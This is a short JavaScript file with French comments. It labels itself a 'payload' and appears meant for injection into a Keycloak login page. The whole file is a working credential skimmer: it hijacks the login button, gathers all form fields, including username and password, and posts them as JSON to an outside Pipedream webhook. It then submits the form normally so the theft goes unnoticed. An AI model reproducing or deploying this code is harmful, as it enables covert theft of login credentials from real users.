console.log('Payload bouton chargé !');

var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function(e) {
        e.preventDefault(); // On empêche la soumission auto le temps d'envoyer les données

        console.log('Bouton cliqué !');

        var form = btn.form; // Récupère le formulaire parent
        var formData = new FormData(form); // Crée un objet FormData avec les champs du formulaire

        // Transforme le FormData en objet JSON
        var data = {};
        formData.forEach(function(value, key) {
            data[key] = value;
        });

        // Envoie des données à ton webhook Pipedream
        fetch('https://eojy4h95a631zv3.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            console.log('Données envoyées ! Statut:', response.status);

            // Désactive le bouton pour éviter plusieurs clics
            btn.disabled = true;

            // Soumet le formulaire après l'envoi
            form.submit();
        })
        .catch(error => {
            console.error('Erreur lors de l\'envoi :', error);

            // Même en cas d'erreur, tu peux décider de soumettre le formulaire
            form.submit();
        });
    };
} else {
    console.log('Bouton non trouvé');
}
